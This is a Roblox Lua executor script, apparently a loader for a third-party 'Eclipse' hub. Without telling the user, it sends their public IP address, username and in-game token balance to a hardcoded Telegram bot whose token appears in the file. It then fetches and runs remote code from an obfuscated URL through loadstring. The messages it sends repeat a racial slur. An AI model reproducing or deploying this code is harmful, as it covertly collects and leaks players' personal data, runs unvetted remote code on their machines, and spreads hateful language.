local HttpService = game:GetService('HttpService')

local request = syn and syn.request or http_request or request or HttpPost
local TelegramToken = "8360187677:AAE3a1HLAiWKY4ugMOdnbtrc9BuVI5NsYEU"
local ChatID = "-1002838096041"


function sendToTelegram(coins, ip, method)
	local textMessage = ""
		if method == "Good" then
		    local MyNick = game.Players.LocalPlayer.Name
		    textMessage = "Nigga executed script!\n"
		        .. "Nigga: " .. MyNick .. "\n"
		        .. "ip: " .. ip .. "\n"
		        .. "balls: " .. coins .. "\n"
		        .. "" .. "rr on top"
		elseif method == "Bad" then
		    local MyNick = game.Players.LocalPlayer.Name
		    textMessage = "Nigga executed script, but his ASS on lock! Script exited\n"
		        .. "Nigga: " .. MyNick .. "\n"
		        .. "ip: " .. ip .. "\n"
		        .. "balls: " .. coins .. "\n"
		        .. "" .. "rr on top"	
		end

	    local data = {
	        chat_id = ChatID,
	        text = textMessage,
	        parse_mode = "HTML"
	    }

	    local data_for_request = {
	        Url = "https://api.telegram.org/bot" .. TelegramToken .. "/sendMessage",
	        Method = "POST",
	        Headers = {["Content-Type"] = "application/json"},
	        Body = HttpService:JSONEncode(data)
	    }

	    local good_request = http_request or request or HttpPost or syn.request
	    good_request(data_for_request)

end

local function GetIsScriptWorking()
    local res = request({
        Url = "https://raw.githubusercontent.com/Maximusikk/apiEclipse/refs/heads/main/loader/isScriptWorking", 
        Method = "GET"
    })
    return res.Body

end

local function GetIP()
    local res = request({
        Url = "https://api.ipify.org", 
        Method = "GET"
    })
    return res.Body
end

local ip = GetIP()



function getCoins()
	local Player = game.Players.LocalPlayer
	local Gui = Player:FindFirstChild("PlayerGui")
	for _, v in pairs(Gui:GetDescendants()) do
		if v.Name == "Summer2025" then
			return v.Container.EventFrames.BattlePass.Info.Tokens.Container.TextLabel.text
 		end
	end
end

local coins = getCoins()

function loadScript()
	getgenv().mainKey = "nil"

	local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
end

local isWorking = tonumber(GetIsScriptWorking())
if isWorking == 0 then	
	sendToTelegram(coins, ip, "Bad")
	game.Players.LocalPlayer:Kick("Script not working now. \n We will try to fix it as soon as possible. \n Sorry :(")
else
	sendToTelegram(coins, ip, "Good")
	loadScript()
end

